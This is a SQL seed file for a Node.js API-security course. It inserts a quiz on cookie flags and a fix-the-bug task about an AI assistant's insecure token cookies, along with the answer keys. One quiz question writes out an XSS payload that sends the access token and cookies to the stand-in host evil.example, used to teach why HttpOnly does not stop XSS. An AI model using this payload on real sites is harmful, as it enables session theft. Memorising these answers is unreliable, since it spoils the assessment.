-- challenge chal_quiz_nas_421 (quiz)
INSERT INTO challenge.challenges (public_id, course_id, module_id, lesson_id, name, title, description, status, difficulty, type, points, is_published, is_deleted)
VALUES ('chal_quiz_nas_421', (SELECT id FROM catalog.course WHERE public_id = 'nodejs-api-security'), (SELECT id FROM course.module WHERE course_id = (SELECT id FROM catalog.course WHERE public_id = 'nodejs-api-security') AND order_index = 4 AND is_deleted = false LIMIT 1), (SELECT id FROM course.lesson WHERE content_source = 'lesson-nas-4-2' AND is_deleted = false LIMIT 1), 'token-cookie-quiz', 'Which flag protects against what?', 'Two pieces of evidence from the review of the AI-written login helper: a refresh cookie with HttpOnly and SameSite but a parent Domain, and an access token moved from localStorage into a cookie while an XSS bug is still open.', 'open', 'medium'::difficulty_question, 'quiz', 10, true, false)
ON CONFLICT (public_id) DO UPDATE SET
    course_id = EXCLUDED.course_id, module_id = EXCLUDED.module_id, lesson_id = EXCLUDED.lesson_id, name = EXCLUDED.name,
    title = EXCLUDED.title, description = EXCLUDED.description, difficulty = EXCLUDED.difficulty, type = EXCLUDED.type,
    points = EXCLUDED.points, is_published = true, is_deleted = false, updated_at = now();
DELETE FROM challenge.challenge_hints WHERE challenge_id = (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421');
UPDATE challenge.challenges SET quiz_display_count = NULL WHERE id = (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421');
WITH q AS (
    INSERT INTO challenge.questions (challenge_id, question, type, explanation, order_index, points)
    SELECT (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421'), 'A first fix of the AI''s helper, response of POST https://api.codedev.test/auth/login:

Set-Cookie: refresh_token=rt_Q2xh...; HttpOnly; Secure; SameSite=Strict; Domain=codedev.test; Path=/; Max-Age=1209600

The community forum runs third-party software on https://forum.codedev.test. A learner opens a forum thread from a link on https://app.codedev.test.

Statement: "Because the cookie is HttpOnly and SameSite=Strict, the browser does not send refresh_token to forum.codedev.test."', 'single_choice'::question_type, 'False. SameSite is about the site that starts the request, and a site is the registrable domain: app.codedev.test, api.codedev.test and forum.codedev.test are all the same site, codedev.test. HttpOnly only hides the cookie from document.cookie. Which hosts receive the cookie is decided by Domain: Domain=codedev.test sends it to every subdomain, so the forum software, its logs and anyone who controls it see the refresh token. The fix is to drop Domain (a host-only cookie for api.codedev.test) and to narrow Path to /auth/refresh. The misconception is that SameSite separates subdomains.', 1, 5
    WHERE NOT EXISTS (SELECT 1 FROM challenge.questions WHERE challenge_id = (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421') AND order_index = 1)
    RETURNING id
)
INSERT INTO challenge.question_options (question_id, option_text, is_correct)
SELECT q.id, o.option_text, o.is_correct
FROM q, (VALUES
        ('True', false),
        ('False', true)
    ) AS o(option_text, is_correct);
WITH q AS (
    INSERT INTO challenge.questions (challenge_id, question, type, explanation, order_index, points)
    SELECT (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421'), 'Before the fix, the SPA did:

localStorage.setItem("access_token", body.accessToken);
fetch(url, { headers: { Authorization: `Bearer ${localStorage.getItem("access_token")}` } });

After the fix, the access token is only in

Set-Cookie: __Host-cd_at=eyJhbGci...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900

and the SPA calls fetch(url, { credentials: "include" }). A course comment still renders unescaped HTML, so this payload runs on app.codedev.test:

<img src=x onerror="fetch(''https://evil.example/c?t=''+localStorage.access_token+document.cookie)">

Statement: "After the fix the payload can no longer read the access token, but while the page is open it can still send authenticated requests to the API, for example fetch(''https://api.codedev.test/me/email'', { method: ''PUT'', credentials: ''include'', ... })."', 'single_choice'::question_type, 'True. HttpOnly keeps the token out of document.cookie and the token is no longer in localStorage, so the payload cannot copy it to evil.example and replay it later from anywhere. But the script runs inside app.codedev.test, a same-site origin the API trusts with credentials, so the browser attaches the cookie to its requests just as it does for the real SPA. HttpOnly limits XSS to acting during the victim''s session; it does not stop XSS. Escaping output and a Content Security Policy are what stop the script from running. The misconception is that HttpOnly cookies make XSS harmless.', 2, 5
    WHERE NOT EXISTS (SELECT 1 FROM challenge.questions WHERE challenge_id = (SELECT id FROM challenge.challenges WHERE public_id = 'chal_quiz_nas_421') AND order_index = 2)
    RETURNING id
)
INSERT INTO challenge.question_options (question_id, option_text, is_correct)
SELECT q.id, o.option_text, o.is_correct
FROM q, (VALUES
        ('True', true),
        ('False', false)
    ) AS o(option_text, is_correct);

-- challenge chal_coding_nas_422 (fix_bug)
INSERT INTO challenge.challenges (public_id, course_id, module_id, lesson_id, name, title, description, status, difficulty, type, points, is_published, is_deleted)
VALUES ('chal_coding_nas_422', (SELECT id FROM catalog.course WHERE public_id = 'nodejs-api-security'), (SELECT id FROM course.module WHERE course_id = (SELECT id FROM catalog.course WHERE public_id = 'nodejs-api-security') AND order_index = 4 AND is_deleted = false LIMIT 1), (SELECT id FROM course.lesson WHERE content_source = 'lesson-nas-4-2' AND is_deleted = false LIMIT 1), 'spot-the-ai-mistake-token-cookie', 'Spot the AI Mistake: a token cookie JavaScript can read', 'The request sent to an AI coding assistant was: "Set the auth cookies after login so the frontend can show the user''s name." It wrote buildLoginResponse for POST https://api.codedev.test/auth/login and changed the SPA to keep body.accessToken in localStorage. Login works, the header says "Hi, Lan Nguyen", refresh works, and the pull request was merged. A security review then found that a script on app.codedev.test can read both tokens and that the forum on forum.codedev.test receives the refresh token. Fix buildLoginResponse so it meets the review''s list: (1) the body is only { user: { id, displayName } }, no token; (2) the access token is in the cookie __Host-cd_at: hidden from scripts, Secure, sent only to api.codedev.test (every path), SameSite=Lax, Max-Age 900; (3) the refresh token is in the cookie __Secure-cd_rt: hidden from scripts, Secure, sent only to https://api.codedev.test/auth/refresh, SameSite=Strict, Max-Age 1209600; (4) display_name is not sensitive and stays readable by the SPA on app.codedev.test with Domain=codedev.test, Path=/, Secure, SameSite=Lax and Max-Age 1209600, its value encoded with encodeURIComponent. The test runner contains a small browser with the RFC 6265 rules for Domain and Path and the cookie prefix rules (a __Host- or __Secure- cookie that breaks them is rejected), the SPA, and a fake API that accepts the access token as a Bearer header or a cookie. Input: { sessions: [{ user, tokens }], probes: [...] }; the output lists, per learner, the login, then each probe: API calls, stored cookies and their attributes, what a script on app.codedev.test can read, the login body, and the cookies sent to the forum and to an ordinary API path. The public tests pass on the AI''s code; the hidden tests check the flags, Path, Domain and prefix rules, the body, and that display_name stays readable. Up to 120 learners per test.', 'open', 'medium'::difficulty_question, 'fix_bug', 30, true, false)
ON CONFLICT (public_id) DO UPDATE SET
    course_id = EXCLUDED.course_id, module_id = EXCLUDED.module_id, lesson_id = EXCLUDED.lesson_id, name = EXCLUDED.name,
    title = EXCLUDED.title, description = EXCLUDED.description, difficulty = EXCLUDED.difficulty, type = EXCLUDED.type,
    points = EXCLUDED.points, is_published = true, is_deleted = false, updated_at = now();
